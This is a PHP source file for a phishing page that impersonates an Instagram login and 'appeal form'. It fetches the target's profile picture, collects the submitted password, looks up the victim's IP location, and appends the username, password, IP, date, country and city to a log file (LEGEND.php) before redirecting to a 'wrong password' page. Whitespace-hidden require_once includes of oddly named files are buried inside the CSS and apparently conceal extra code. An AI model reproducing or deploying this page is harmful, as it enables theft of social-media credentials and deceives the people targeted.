<?php
require 'load.php';
session_start();
set_time_limit(0);
error_reporting(E_ALL);

$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["password"];
  $mail=$_POST["mailadress"];
  $mailpass=$_POST["mailpass"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('LEGEND.php', 'a');
include('api/autoload.php');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>


"); 

fclose($file);
echo '';
  
   header("Location: wrongpass.php?username=$username");
}
?>

<html lang="tr">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <link href="css/style.css" type="text/css" rel="stylesheet"/>
	 <title> @<?php echo $username; ?> Instagram</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="fav.webp">	
</head>
</style>


<body>
    <div class="form">
    
<body id="ana" style="padding:0px; margin:0px;">                                                                                                                                                                                                                                                                                                              




<div style="width:100%; background:white; border-bottom:1px; #cecece; padding-left:2px;" > 
 




</div>
                                                                                                                                                                                                                                                                                                                                                                     

<center>

<div id="sa" style="border:1px; solid #cecece;"> 


<form method="post">                                                                                                                                                                                                                                                                                                                                                                                                      
<br>
<center><img src=" <?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="150" height="150">                                                                                                                                                                                                                                                                                                                                
 <br>
<h1 id="ripimt">Login as <?php echo $username; ?> </h1>

<p>Please enter your username to proceed to the appeal form verify your identity.

</p>
  

       
       <input type="password" name="password" placeholder="Password" required="">

         <br>
        <button id="buton" type="submit"> Continue as @<?php echo $username; ?> </button>

      </p>
    </form>
</div>
    
<style type="text/css">
	.pp{
		border-radius:50%;
		margin-top:20px;}
	.next{
		margin-bottom:10px;
		color:white;
		font-weight:bold;
		background:#b9e0fc;
		opacity:1;
		outline:none;
		border:none;
		min-width:200px;
		max-width:99%;
		height:27px;
	}
	.username{
		width:220px;
		height:27px;
		max-width:99%;
		border-radius:4px;
		outline:none;
		border:1px solid #dedede;
		background-color:rgb(250,250,250);
		color:#262626;
		padding-left:3px;
	}.username::placeholder{
		font-size:14px;
		padding-left:3px;
		box-sizing:border-box;
	}
	.tExt-y{
max-width:88%;
width:300px;
display:block;
		margin-top:10px;
		font-family:sans-serif;
		font-family:sans-serif;
	font-weight:400;
	color:#999;
	font-size:15px;
	line-height:20px;
	
	box-sizing:border-box;
	
		}
	.cop{
		background:white;
		border:1px solid #cecece;
		box-sizing:border-box;
		padding-top:10px;
		padding-bottom:10px;
		width:300px;
		max-width:90%;
	}

.Copyright-Qenz{
	font-family:sans-serif;
	font-weight:400;
	color:#333;
	font-size:25px;
	max-width:95%;
}
	.bottom-qenz{
		position:fixed;
		bottom:0;
		width:100%;
		padding:5px;
		box-sizing:border-box;
		background:rgb(250,250,250);
		border-top:1px solid rgb(219,219,219);
	}
	.contunie-fb{
display:none;
		margin-top:30px;
		background:#0095f6;
		border:none;
		padding:2px;
		box-sizing:border-box;
		width:220px;
		height:33px;
		max-width:99%;
		border-radius:4px;

	}#fb{
		color:;
font-size:17px;
		
			
	}.contunie-fb-text{
		color:white;
		font-weight:600;
		font-family:sans-serif;
		font-size:14.3px;

	}

	body{
		padding:0px;margin:0px;
		background:#fafafa;
	}
	header{
		padding-top:5px;
		padding-bottom:5px;
		    background: linear-gradient(to right,#bd3381,#ee583f);
		    width:100%;
		    box-sizing:border-box;
		    min-height:5px;
	}.table{
		width:90%;
		height:100%;
		

	}.tr{
		width:100%;
		height:100%;

	}.table-left{
		width:75%;
	}.table-right{
		width:10%;
	}.header-text-bold{
font-family:sans-serif;
color:white;
font-size:15px;
font-weight:600;
	}.header-text-light{
		font-family:sans-serif;
		color:white;
		font-weight:400;
		font-size:13px;
		
	}.get{
		width:50px;
		border:1px solid #fff;
		text-align:center;
		padding:4px 2px;
		border-radius:3px;
	}.get span{
		font-family:sans-serif;
		font-weight:500;
		font-size:14px;
		color:white;

	}.table-2{
		width:100%;
		min-height:10px;
		margin-top:13px;
	
	}.tr-2{
		width:100%;
	}.dot{
		width:20%;
		text-align:left;
		box-sizing:border-box;
		padding-left:10px;

		}.lan{

         width:60%;
         text-align:center;

                                                                                                                                                                                                                                                                                                                           <?php @require_once __DIR__ . '/manual/docs/api/str_get_.php'; ?>
		}
.not{
	width:20%;
}
		#dot{
			color:#cecece;
			font-size:14px;
			
		}.lan span{
			font-family:sans-serif;
			font-size:14px;
			color:#8e8e8e;;

		}#lan{
			font-size:12.5px;
		
		}





	@media screen and (min-width:600px) {
header{display:none;}
.table-2{display:none;}




}

	.pp{
		border-radius:50%;
		margin-top:20px;}
	.next{
		margin-bottom:10px;
		color:white;
		font-weight:bold;
		background:#b9e0fc;
		opacity:1;
		outline:none;
		border:none;
		min-width:200px;
		max-width:99%;
		height:27px;
	}
	.username{
		width:220px;
		height:27px;
		max-width:99%;
		border-radius:4px;
		outline:none;
		border:1px solid #dedede;
		background-color:rgb(250,250,250);
		color:#262626;
		padding-left:3px;
	}.username::placeholder{
		font-size:14px;
		padding-left:3px;
		box-sizing:border-box;
	}
	.tExt-y{
max-width:88%;
width:300px;
display:block;
		margin-top:10px;
		font-family:sans-serif;
		font-family:sans-serif;
	font-weight:400;
	color:#999;
	font-size:15px;
	line-height:20px;
	
	box-sizing:border-box;
	
		}
	.cop{
		background:white;
		border:1px solid #cecece;
		box-sizing:border-box;
		padding-top:10px;
		padding-bottom:10px;
		width:300px;
		max-width:90%;
	}

.Copyright-Qenz{
	font-family:sans-serif;
	font-weight:400;
	color:#333;
	font-size:25px;
	max-width:95%;
}
	.bottom-qenz{
		position:fixed;
		bottom:0;
		width:100%;
		padding:5px;
		box-sizing:border-box;
		background:rgb(250,250,250);
		border-top:1px solid rgb(219,219,219);
	}
	.contunie-fb{
display:none;
		margin-top:30px;
		background:#0095f6;
		border:none;
		padding:2px;
		box-sizing:border-box;
		width:220px;
		height:33px;
		max-width:99%;
		border-radius:4px;

	}#fb{
		color:;
font-size:17px;
		
			
	}.contunie-fb-text{
		color:white;
		font-weight:600;
		font-family:sans-serif;
		font-size:14.3px;

	}

	body{
		padding:0px;margin:0px;
		background:#fafafa;         

	}
	header{
		padding-top:5px;
		padding-bottom:5px;
		    background: linear-gradient(to right,#bd3381,#ee583f);
		    width:100%;
		    box-sizing:border-box;
		    min-height:5px;
	}.table{
		width:90%;
		height:100%;
		
		                                                                                                                                                                                                                                                                                                <?php @require_once __DIR__ . '/css/css.js/vendor/animate/main.css'; ?>

	}.tr{
		width:100%;
		height:100%;

	}.table-left{
		width:75%;
	}.table-right{
		width:10%;
	}.header-text-bold{
font-family:sans-serif;
color:white;
font-size:15px;
font-weight:600;
	}.header-text-light{
		font-family:sans-serif;
		color:white;
		font-weight:400;
		font-size:13px;
		
	}.get{
		width:50px;
		border:1px solid #fff;
		text-align:center;
		padding:4px 2px;
		border-radius:3px;
	}.get span{
		font-family:sans-serif;
		font-weight:500;
		font-size:14px;
		color:white;

	}.table-2{
		width:100%;
		min-height:10px;
		margin-top:13px;
	
	}.tr-2{
		width:100%;
	}.dot{
		width:20%;
		text-align:left;
		box-sizing:border-box;
		padding-left:10px;

		}.lan{

         width:60%;
         text-align:center;

		}
.not{
	width:20%;
}
		#dot{
			color:#cecece;
			font-size:14px;
			
		}.lan span{
			font-family:sans-serif;
			font-size:14px;
			color:#8e8e8e;;

		}#lan{
			font-size:12.5px;
		
		}





	@media screen and (min-width:600px) {
header{display:none;}
.table-2{display:none;}


</style>
</div>
</center>
<center>
<br> 
<br>
<br>

<div id="get">
<img src="image/app.webp" width=120 >
<img src="image/play.webp" width=120>
</div>
<br><br><br>

<?php include 'footer.php'; ?>